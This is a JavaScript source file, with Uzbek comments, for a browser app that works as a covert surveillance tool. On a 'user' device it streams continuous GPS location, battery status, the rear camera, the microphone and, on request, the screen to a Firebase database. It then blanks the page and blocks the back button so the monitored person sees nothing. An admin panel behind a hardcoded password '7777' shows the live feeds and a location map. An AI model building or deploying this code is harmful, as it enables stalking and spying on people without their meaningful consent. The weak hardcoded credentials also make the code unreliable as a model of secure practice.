// 1. FIREBASE KONFIGURATSIYASI
const firebaseConfig = {
    apiKey: "AIzaSyBhzWWFFgrOH84J2RIW5o7l_8192iPtbOg",
    authDomain: "code-vibe-df610.firebaseapp.com",
    projectId: "code-vibe-df610",
    databaseURL: "https://code-vibe-df610-default-rtdb.firebaseio.com",
    storageBucket: "code-vibe-df610.firebasestorage.app",
    messagingSenderId: "747762490655",
    appId: "1:747762490655:web:125516814620784cf3a42a",
    measurementId: "G-3QE6F8LWZ1"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();
const adminPass = "7777";

let peer = null;
let adminPeer = null;
let localStream = null;
let screenStream = null;
let adminMicStream = null;
let isTalking = false;
let currentActiveCallId = null;
let map = null;
let marker = null;

// Brauzer "Orqaga" tugmasini cheklash
window.history.pushState(null, null, window.location.href);
window.onpopstate = () => window.history.pushState(null, null, window.location.href);

window.onload = () => {
    const role = localStorage.getItem('myRTC_role');
    const name = localStorage.getItem('myRTC_deviceName');
    if (role === 'user' && name) startUserLogic(name);
    else if (role === 'admin') openAdmin(true);
};

function goHome() {
    if (confirm("Chiqishni xohlaysizmi?")) {
        localStorage.clear();
        window.location.reload();
    }
}

// QURILMA MODELINI TO'LIQ ANIQLASH
function getDetailedModel() {
    const ua = navigator.userAgent;
    let os = "Noma'lum OS";
    if (ua.indexOf("Win") !== -1) os = "Windows";
    else if (ua.indexOf("Mac") !== -1) os = "MacOS";
    else if (ua.indexOf("Linux") !== -1) os = "Linux/Ubuntu";
    else if (ua.indexOf("Android") !== -1) {
        const match = ua.match(/\(([^;]+);([^;]+);/);
        os = match ? match[2].trim() : "Android";
    }
    
    let browser = "Brauzer";
    if (ua.indexOf("Firefox") !== -1) browser = "Firefox";
    else if (ua.indexOf("Chrome") !== -1) browser = "Chrome";
    else if (ua.indexOf("Safari") !== -1) browser = "Safari";
    
    return `${os}_${browser}`;
}

// --- USER MODE ---
async function openUser() {
    const user = prompt("Ismingizni kiriting:");
    if (!user) return;
    const fullName = `${user}(${getDetailedModel()})`;
    localStorage.setItem('myRTC_role', 'user');
    localStorage.setItem('myRTC_deviceName', fullName);
    startUserLogic(fullName);
}

async function startUserLogic(deviceName) {
    document.getElementById('main-ui').style.display = 'none';
    peer = new Peer();

    peer.on('open', (id) => {
        const ref = db.ref('devices/' + id);
        ref.set({ name: deviceName, status: 'online', details: navigator.userAgent });
        ref.onDisconnect().remove();

        // GPS Kuzatuv
        if (navigator.geolocation) {
            navigator.geolocation.watchPosition(p => {
                db.ref('devices/' + id + '/location').set({
                    lat: p.coords.latitude,
                    lng: p.coords.longitude,
                    time: new Date().toLocaleTimeString()
                });
            }, null, { enableHighAccuracy: true });
        }

        // Batareya
        if (navigator.getBattery) {
            navigator.getBattery().then(b => {
                const upd = () => db.ref('devices/' + id + '/info').update({ battery: Math.floor(b.level * 100) + "%", charging: b.charging });
                upd(); b.onlevelchange = upd; b.onchargingchange = upd;
            });
        }
    });

    try {
        localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true });
        
        peer.on('call', async (call) => {
            // Agar Admin ekran ulashni so'rayotgan bo'lsa
            if (call.metadata && call.metadata.type === 'getScreen') {
                try {
                    screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                    call.answer(screenStream);
                } catch (e) { console.log("Ekran berilmadi"); }
            } else {
                call.answer(localStream);
            }
            call.on('stream', s => { const a = new Audio(); a.srcObject = s; a.play(); });
        });

        document.body.innerHTML = '<div class="user-nav" onclick="goHome()"></div>';
    } catch (e) { alert("Kamera ruxsati berilmadi!"); }
}

// --- ADMIN MODE ---
function openAdmin(auto = false) {
    if (!auto && prompt("Parol:") !== adminPass) return;
    localStorage.setItem('myRTC_role', 'admin');
    document.getElementById('main-ui').style.display = 'none';
    document.getElementById('admin-panel').style.display = 'block';
    document.getElementById('top-nav').style.display = 'flex';

    if (!adminPeer) adminPeer = new Peer();

    db.ref('devices').on('value', snap => {
        const list = document.getElementById('device-list');
        list.innerHTML = "";
        snap.forEach(child => {
            const btn = document.createElement('button');
            btn.innerText = child.val().name;
            btn.onclick = () => connectToDevice(child.key, child.val().name, child.val().details);
            list.appendChild(btn);
        });
    });
}

function connectToDevice(id, name, details) {
    if (currentActiveCallId) {
        db.ref('devices/' + currentActiveCallId + '/info').off();
        db.ref('devices/' + currentActiveCallId + '/location').off();
    }
    currentActiveCallId = id;
    document.getElementById('target-name').innerText = "Qurilma: " + name;
    document.getElementById('device-details').innerHTML = `<b>Texnik ID:</b> ${id}<br><b>User Agent:</b><br>${details.substring(0, 100)}...`;

    // Ma'lumotlarni yangilash
    db.ref('devices/' + id + '/info').on('value', s => {
        const i = s.val();
        if (i) document.getElementById('battery-display').innerText = `Quvvat: ${i.battery} ${i.charging ? '(⚡)' : ''}`;
    });

    db.ref('devices/' + id + '/location').on('value', s => {
        const l = s.val();
        if (l) {
            document.getElementById('location-display').innerText = `Kordinata: ${l.lat}, ${l.lng} (${l.time})`;
            initMap(l.lat, l.lng);
        }
    });

    // 1. Kamera qo'ng'irog'i
    adminPeer.call(id, null).on('stream', s => { 
        document.getElementById('remoteVideo').srcObject = s; 
    });
    
    // 2. Ekran qo'ng'irog'i (Maxsus so'rov yuboramiz)
    const screenCall = adminPeer.call(id, null, { metadata: { type: 'getScreen' } });
    screenCall.on('stream', s => { 
        document.getElementById('screenVideo').srcObject = s; 
    });
}

function initMap(lat, lng) {
    if (!map) {
        map = L.map('map').setView([lat, lng], 16);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        marker = L.marker([lat, lng]).addTo(map);
    } else { marker.setLatLng([lat, lng]); map.setView([lat, lng]); }
}

async function toggleTalk() {
    const btn = document.getElementById('talkBtn');
    if (!isTalking) {
        try {
            adminMicStream = await navigator.mediaDevices.getUserMedia({ audio: true });
            adminPeer.call(currentActiveCallId, adminMicStream);
            isTalking = true; btn.innerText = "GAPIRILMOQDA... (STOP)"; btn.style.background = "red";
        } catch (e) { alert("Mikrofon xatosi!"); }
    } else {
        if (adminMicStream) adminMicStream.getTracks().forEach(t => t.stop());
        isTalking = false; btn.innerText = "GAPIRISH (Yopiq)"; btn.style.background = "#28a745";
    }
}
